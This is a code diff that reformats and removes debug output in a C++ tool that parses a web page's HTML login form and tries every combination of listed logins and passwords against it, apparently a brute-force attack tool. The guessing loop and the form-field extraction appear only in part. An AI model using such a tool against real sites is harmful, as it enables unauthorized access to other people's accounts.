@@ -46,14 +46,13 @@ static int writer(char *data, size_t size, size_t nmemb,
 //  libcurl connection initialization
 //
 
-static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp)
-{
-  struct WriteThis *pooh = (struct WriteThis *)userp;
-  printf("%s %s %d \n", __FILE__, __func__, __LINE__);
-  if(size*nmemb < 1)
-    return 0;
+static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
+	struct WriteThis *pooh = (struct WriteThis *)userp;
+	if(size*nmemb < 1){	
+		return 0;
+	}
  
-  return 0;                          /* no more data left to deliver */ 
+  return 0; 
 }
 
 static bool init(CURL *&conn, char *url){
@@ -117,9 +116,9 @@ static bool init(CURL *&conn, char *url){
 const xmlChar* findElement(const xmlChar **attributes, const char* element){
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), element)){
-				return *(attributes + i + 1);
-			}
+			return *(attributes + i + 1);
 		}
+	}
 	return NULL;
 }
 
@@ -139,7 +138,7 @@ const xmlChar* findElementNameByType(const xmlChar **attributes, const char* ele
 const xmlChar* findElementValueByType(const xmlChar **attributes, const char* elementType){
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), elementType)){
-				return *(attributes + i + 1);
+			return *(attributes + i + 1);
 		}
 	}
 	return NULL;
@@ -148,10 +147,7 @@ const xmlChar* findElementValueByType(const xmlChar **attributes, const char* el
 //
 //  libxml start element callback function
 //
-static void StartElement(void *voidContext,
-                         const xmlChar *name,
-                         const xmlChar **attributes) {
-
+static void StartElement(void *voidContext, const xmlChar *name, const xmlChar **attributes){
 	Context *context = (Context *)voidContext;
 	if (!strcasecmp((char *)name, "form")){
 		const xmlChar* tempFormMethod = findElement(attributes, "method");
@@ -206,8 +202,7 @@ static void EndElement(void *voidContext,
   }*/
 }
 
-static htmlSAXHandler saxHandler =
-{
+static htmlSAXHandler saxHandler = {
   NULL,
   NULL,
   NULL,
@@ -241,18 +236,16 @@ static htmlSAXHandler saxHandler =
 //  Parse given (assumed to be) HTML text and btutforce atack on the page
 //
 
-static void parseHtml(const std::string &html)
-{
-  htmlParserCtxtPtr ctxt;
-  Context context;
-  ctxt = htmlCreatePushParserCtxt(&saxHandler, &context, "", 0, "",
-                                  XML_CHAR_ENCODING_NONE);
-  htmlParseChunk(ctxt, html.c_str(), html.size(), 0);
-  htmlParseChunk(ctxt, "", 0, 1);
-  htmlFreeParserCtxt(ctxt);
+static void parseHtml(const std::string &html){
+	htmlParserCtxtPtr ctxt;
+	Context context;
+	ctxt = htmlCreatePushParserCtxt(&saxHandler, &context, "", 0, "", XML_CHAR_ENCODING_NONE);
+	htmlParseChunk(ctxt, html.c_str(), html.size(), 0);
+	htmlParseChunk(ctxt, "", 0, 1);
+	htmlFreeParserCtxt(ctxt);
 }
 
-string* concat(const xmlChar *login, string loginValue,const xmlChar *password, string passwordValue) {
+string* concat(const xmlChar *login, string loginValue,const xmlChar *password, string passwordValue){
 	string* result = new string;
 
 	result->append((char*)login);
@@ -272,12 +265,9 @@ static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passw
 	size_t lenPassword = 0;
 	CURLcode res;
 
-	cout<<__LINE__<<endl;
 	//Brute force for all combinations of the given logins and passwords
 	for (list<string>::iterator loginIt = logins.begin(); loginIt != logins.end(); ++loginIt){
-		cout<<__LINE__<<endl;
 		for (list<string>::iterator passwordIt = passwords.begin(); passwordIt != passwords.end(); ++passwordIt){
-			cout<<__LINE__<<endl;
 			data = concat(form.login, *loginIt, form.password, *passwordIt);
 			cout<<*data<<endl;
 			if(!strcasecmp((char*)form.formMethod, "post")){
